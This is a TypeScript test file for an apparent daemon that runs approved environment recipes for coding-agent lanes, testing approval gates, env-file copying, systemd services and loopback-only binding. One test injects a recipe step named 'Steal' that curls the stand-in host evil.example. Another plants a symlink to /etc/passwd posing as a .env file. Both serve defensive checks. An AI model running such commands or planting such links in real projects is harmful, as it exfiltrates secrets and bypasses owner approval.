import { mkdir, mkdtemp, readFile, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { RECIPE_FILE, type LaneEvent } from "@contextlanes/protocol";
import { buildServer, Config, EventBus, HostLinks, LaneManager, publicBindings, Runtime, serviceArgs, Store, type Runner } from "@contextlanes/daemon";
import { readRecipe } from "../src/recipes.js";

const roots: string[] = [];
afterEach(async () => { await Promise.all(roots.splice(0).map((r) => rm(r, { recursive: true, force: true }))); });
const RECIPE = { cache: ["node_modules", "missing"], setup: [{ name: "Migrate", command: ["pnpm", "migrate"] }], services: [
  { name: "api", command: ["node", "api.js", "--port", "$PORT", "--web", "$PORT_WEB"], health: { path: "/health", timeoutSeconds: 1 } },
  { name: "web", command: ["vite", "--port=$PORT", "--host=$HOST"], port: { env: "VITE_PORT" }, health: { timeoutSeconds: 1 } },
] };

type Options = { ignored?: string[]; active?: string; ss?: string; setupFails?: boolean; health?: number };
async function setup(opts: Options = {}, recipe: unknown = RECIPE) {
  const root = await mkdtemp(join(tmpdir(), "cl-runtime-"));
  roots.push(root);
  const repo = join(root, "repo"); const worktree = join(root, "lane");
  await mkdir(repo); await mkdir(worktree);
  const calls: string[][] = [];
  const state = { active: opts.active ?? "active", ss: opts.ss ?? "", health: opts.health ?? 200, cpFails: false };
  const run: Runner = async (cmd, args) => {
    calls.push([cmd, ...args]);
    if (cmd === "git" && args[0] === "ls-files") return { stdout: (opts.ignored ?? []).join("\0") };
    if (cmd === "systemctl" && args[1] === "show") return { stdout: `ActiveState=${state.active}\nControlGroup=/user.slice/x\n` };
    if (cmd === "tailscale") return { stdout: args[0] === "status" ? JSON.stringify({ BackendState: "Running", Self: { DNSName: "neo.tail1.ts.net." } }) : "{}" };
    if (cmd === "cat") return { stdout: "4242\n" };
    if (cmd === "ss") return { stdout: state.ss };
    if (cmd === "du") return { stdout: `2048\t${worktree}\n` };
    if (cmd === "cp" && args[0] === "-al" && state.cpFails) throw new Error("Invalid cross-device link");
    if (cmd === "journalctl") return { stdout: `${JSON.stringify({ __REALTIME_TIMESTAMP: "1793000000000000", MESSAGE: "GET /health 200" })}\n` };
    if (cmd === "systemd-run" && args.includes("--wait") && opts.setupFails) throw Object.assign(new Error("exit 1"), { stdout: "migration 12 failed\n" });
    return { stdout: "" };
  };
  const config = Config.parse({ paths: { data: root, lanes: root } });
  const store = Store.open(":memory:");
  const bus = new EventBus();
  const seen: LaneEvent[] = [];
  bus.subscribeAll((e) => seen.push(e));
  let port = 20100;
  const runtime = new Runtime({ store, bus, config, run, freePort: async () => port++, fetch: (async () => new Response("ok", { status: state.health })) as typeof fetch });
  const app = buildServer({ store, bus, lanes: new LaneManager({ store, bus, config, run }), hosts: new HostLinks({ store, bus }), config, version: "test", run, runtime });
  store.addProject({ id: "shop", name: "Shop", path: repo });
  store.insertLane({ id: "shop/01", n: 1, project: "shop", goal: null, task: "Billing", agent: "codex", model: null, mode: "ask", branch: "lane/01-billing", worktree, terminal: "cl-shop-01", hostUnit: null, base: null, state: "working", colour: "lc1" });
  await writeFile(join(worktree, RECIPE_FILE), JSON.stringify(recipe));
  const approve = async () => store.approveRecipe("shop", (await readRecipe(store, store.getProject("shop")!, worktree))!.hash);
  return { root, repo, worktree, store, runtime, app, calls, state, seen, approve };
}
const started = (calls: string[][]) => calls.filter((c) => c[0] === "systemd-run" && !c.includes("--wait"));

describe("recipe gate", () => {
  it("refuses to start an unapproved recipe, asks the owner once and runs nothing", async () => {
    const { app, store, calls } = await setup();
    for (let i = 0; i < 2; i++) {
      const res = await app.inject({ method: "POST", url: "/api/lanes/shop/01/tools/env_start", payload: {} });
      expect(res.statusCode).toBe(409);
      expect(res.json().error).toMatch(/needs the owner's approval on the Run page/);
    }
    expect(calls.filter((c) => ["systemd-run", "cp"].includes(c[0]!))).toEqual([]);
    expect(store.events("shop/01").filter((e) => e.type === "recipe.requested")).toHaveLength(1);
    expect(store.inbox()).toMatchObject([{ kind: "approval", lane: "shop/01" }]);
  });

  it("needs approval again when an agent edits the recipe in its lane", async () => {
    const { app, worktree, approve } = await setup();
    await approve();
    await writeFile(join(worktree, RECIPE_FILE), JSON.stringify({ ...RECIPE, setup: [{ name: "Steal", command: ["curl", "evil.example"] }] }));
    expect((await app.inject({ method: "POST", url: "/api/lanes/shop/01/env/start", payload: {} })).statusCode).toBe(409);
  });
});

describe("lane setup", () => {
  it("copies ignored env files, links the cache, runs setup and records it", async () => {
    const { repo, worktree, runtime, calls, approve } = await setup({ ignored: [".env", "apps/web/.env.local", "linked/.env"] });
    await writeFile(join(repo, ".env"), "SECRET=1");
    await mkdir(join(repo, "apps/web"), { recursive: true }); await writeFile(join(repo, "apps/web/.env.local"), "LOCAL=1");
    await mkdir(join(repo, "linked")); await symlink("/etc/passwd", join(repo, "linked/.env"));
    await mkdir(join(repo, "node_modules"));
    await approve();
    const env = await runtime.start("shop/01");
    expect(env.error).toBeNull();
    expect(await readFile(join(worktree, "apps/web/.env.local"), "utf8")).toBe("LOCAL=1");
    expect(env.setup).toMatchObject({ ignored: [".env", "apps/web/.env.local"], cache: "linked", steps: 1, disk: 2048 });
    expect(calls.filter((c) => c[0] === "cp")).toEqual([["cp", "-al", join(repo, "node_modules"), join(worktree, "node_modules")]]);
    expect(calls.find((c) => c[0] === "systemd-run" && c.includes("--wait"))!.slice(-2)).toEqual(["pnpm", "migrate"]);
  });

  it("falls back to copying when links cannot cross filesystems, and keeps an existing env file", async () => {
    const { repo, worktree, runtime, calls, state, approve } = await setup({ ignored: [".env"] });
    await writeFile(join(repo, ".env"), "NEW=1"); await writeFile(join(worktree, ".env"), "KEEP=1");
    await mkdir(join(repo, "node_modules"));
    state.cpFails = true;
    await approve();
    expect((await runtime.start("shop/01")).setup!.cache).toBe("copied");
    expect(calls.filter((c) => c[0] === "cp").at(-1)).toEqual(["cp", "-a", "--reflink=auto", join(repo, "node_modules"), join(worktree, "node_modules")]);
    expect(await readFile(join(worktree, ".env"), "utf8")).toBe("KEEP=1");
  });

  it("stops at a failed setup step, starts no service and says why", async () => {
    const { app, calls, seen, store, approve } = await setup({ setupFails: true });
    await approve();
    const res = await app.inject({ method: "POST", url: "/api/lanes/shop/01/env/start", payload: {} });
    expect(res.statusCode).toBe(409);
    expect(res.json().error).toMatch(/Setup stopped. Migrate failed: migration 12 failed/);
    expect(started(calls)).toEqual([]);
    expect(store.environment("shop/01")!.error).toMatch(/migration 12/);
    expect(seen.at(-1)).toMatchObject({ type: "env.status", payload: { service: "setup", state: "failed" } });
  });

  it("does not repeat setup when the same recipe restarts", async () => {
    const { runtime, calls, approve } = await setup();
    await approve();
    await runtime.start("shop/01");
    await runtime.stop("shop/01");
    await runtime.start("shop/01");
    expect(calls.filter((c) => c[0] === "systemd-run" && c.includes("--wait"))).toHaveLength(1);
  });
});

describe("services", () => {
  it("runs each service as a user unit on a free loopback port, with units unique per start", async () => {
    const { runtime, calls, seen, approve } = await setup();
    await approve();
    const env = await runtime.start("shop/01");
    expect(env.services.map((s) => [s.name, s.port, s.state])).toEqual([["api", 20100, "healthy"], ["web", 20101, "healthy"]]);
    const [api, web] = started(calls);
    expect(api).toEqual(expect.arrayContaining(["--user", "--collect", "--setenv=PORT=20100", "--setenv=HOST=127.0.0.1", "--setenv=PORT_WEB=20101"]));
    expect(api!.slice(-6)).toEqual(["node", "api.js", "--port", "20100", "--web", "20101"]);
    expect(web).toContain("--setenv=VITE_PORT=20101");
    expect(web!.slice(-3)).toEqual(["vite", "--port=20101", "--host=127.0.0.1"]);
    expect(env.services[0]!.unit).toMatch(/^contextlanes-env-shop-01-api-[0-9a-f]{6}$/);
    expect(seen.filter((e) => e.type === "env.status").map((e) => e.payload)).toContainEqual(expect.objectContaining({ service: "api", up: true, port: 20100, state: "healthy" }));
  });

  it("writes a literal dollar through systemd", () => {
    const service = { name: "x", command: ["sh", "$PORT", "$NOT_OURS"], port: { env: "PORT" }, health: { path: "/", status: 200, timeoutSeconds: 1 }, env: {} };
    expect(serviceArgs("u", "/w", service, { PORT: "1" }).slice(-3)).toEqual(["sh", "1", "$$NOT_OURS"]);
  });

  it("marks a service that never answers as failed and keeps recent probes", async () => {
    const { runtime, approve, seen } = await setup({ health: 503 });
    await approve();
    const env = await runtime.start("shop/01");
    expect(env.services[0]).toMatchObject({ state: "failed", detail: "/health answered 503, not 200." });
    expect(env.services[0]!.probes.at(-1)).toBe(false);
    expect(seen.findLast((e) => e.type === "env.status")).toMatchObject({ payload: { up: false, state: "failed" } });
  });

  it("records a failure and a recovery, and only logs the changes", async () => {
    const { runtime, store, state, seen, approve } = await setup();
    await approve();
    await runtime.start("shop/01");
    const before = seen.length;
    await runtime.poll();
    expect(seen.length).toBe(before);
    state.health = 500;
    await runtime.poll();
    expect(store.environment("shop/01")!.services[0]).toMatchObject({ state: "failed" });
    expect(store.environment("shop/01")!.services[0]!.lastFailure).toBeTruthy();
    state.health = 200;
    await runtime.poll();
    const api = store.environment("shop/01")!.services[0]!;
    expect(api).toMatchObject({ state: "healthy", detail: null });
    expect(api.lastFailure).toBeTruthy();
    expect(api.probes.slice(-3)).toEqual([true, false, true]);
  });

  it("stops a service that listens beyond loopback and keeps the reason", async () => {
    const { runtime, state, calls, store, approve } = await setup();
    await approve();
    await runtime.start("shop/01");
    state.ss = `LISTEN 0 511 0.0.0.0:3000 0.0.0.0:* users:(("node",pid=4242,fd=18))`;
    await runtime.poll();
    const api = store.environment("shop/01")!.services[0]!;
    expect(api.state).toBe("failed");
    expect(api.detail).toMatch(/listened on 0.0.0.0:3000/);
    expect(calls).toContainEqual(["systemctl", "--user", "stop", api.unit]);
    state.active = "inactive";
    await runtime.poll();
    expect(store.environment("shop/01")!.services[0]!.detail).toMatch(/listened on/);
  });

  it("finds public listeners only for the service's own processes", () => {
    const ss = [`LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* users:(("r",pid=1,fd=1))`, `LISTEN 0 511 127.0.0.1:3000 0.0.0.0:* users:(("n",pid=2,fd=1))`, `LISTEN 0 511 [::1]:3001 [::]:* users:(("n",pid=2,fd=1))`,
      `LISTEN 0 511 *:3002 *:* users:(("n",pid=2,fd=1))`, `LISTEN 0 511 [::]:3003 [::]:* users:(("n",pid=2,fd=2),("n",pid=3,fd=2))`, `LISTEN 0 511 100.64.0.1:3004 0.0.0.0:* users:(("n",pid=2,fd=3))`, `LISTEN 0 511 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=9,fd=3))`].join("\n");
    expect(publicBindings(ss, new Set(["2"]))).toEqual(["*:3002", "[::]:3003", "100.64.0.1:3004"]);
  });

  it("stops units, keeps their logs readable and refuses a finished lane", async () => {
    const { app, runtime, store, calls, approve } = await setup();
    await approve();
    const env = await runtime.start("shop/01");
    await app.inject({ method: "POST", url: "/api/lanes/shop/01/env/stop", payload: {} });
    expect(calls).toContainEqual(["systemctl", "--user", "stop", env.services[1]!.unit]);
    expect(store.environment("shop/01")!.services.map((s) => s.state)).toEqual(["stopped", "stopped"]);
    expect((await app.inject({ method: "POST", url: "/api/lanes/shop/01/tools/get_logs", payload: { service: "api" } })).json()).toEqual([{ at: new Date(1793000000000).toISOString(), text: "GET /health 200" }]);
    expect((await app.inject({ url: "/api/lanes/shop/01/logs?service=nope" })).statusCode).toBe(404);
    store.setLaneState("shop/01", "archived");
    expect((await app.inject({ method: "POST", url: "/api/lanes/shop/01/tools/env_start", payload: {} })).statusCode).toBe(409);
  });

  it("lists each open lane's recipe and environment for the Run page", async () => {
    const { app, runtime, store, approve } = await setup();
    await approve();
    await runtime.start("shop/01");
    const page = (await app.inject({ url: "/api/projects/shop/environments" })).json();
    expect(page.lanes).toMatchObject([{ lane: "shop/01", recipe: { approved: true }, environment: { services: [{ name: "api" }, { name: "web" }] } }]);
    store.setLaneState("shop/01", "archived");
    expect((await app.inject({ url: "/api/projects/shop/environments" })).json().lanes).toEqual([]);
  });

  it("gives env_status through the toolbox route", async () => {
    const { app, runtime, approve } = await setup();
    await approve();
    await runtime.start("shop/01", ["api"]);
    const res = await app.inject({ method: "POST", url: "/api/lanes/shop/01/tools/env_status", payload: {} });
    expect(res.json().services.map((s: { name: string }) => s.name)).toEqual(["api"]);
  });
});
